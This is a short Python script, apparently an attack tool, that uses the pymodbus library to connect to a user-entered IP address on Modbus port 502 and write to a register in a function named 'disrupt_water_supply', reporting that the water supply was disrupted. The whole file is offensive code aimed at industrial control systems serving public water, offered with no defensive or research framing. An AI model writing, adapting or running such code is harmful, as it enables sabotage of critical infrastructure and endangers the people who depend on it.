from pymodbus.client.sync import ModbusTcpClient as ModbusClient

def disrupt_water_supply(target):
    client = ModbusClient(target, port=502)
    try:
        client.connect()
        client.write_register(1, 1)
        print(f"Disrupted water supply at {target}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

def main():
    target = input("Enter target IP: ")
    disrupt_water_supply(target)

if __name__ == "__main__":
    main()
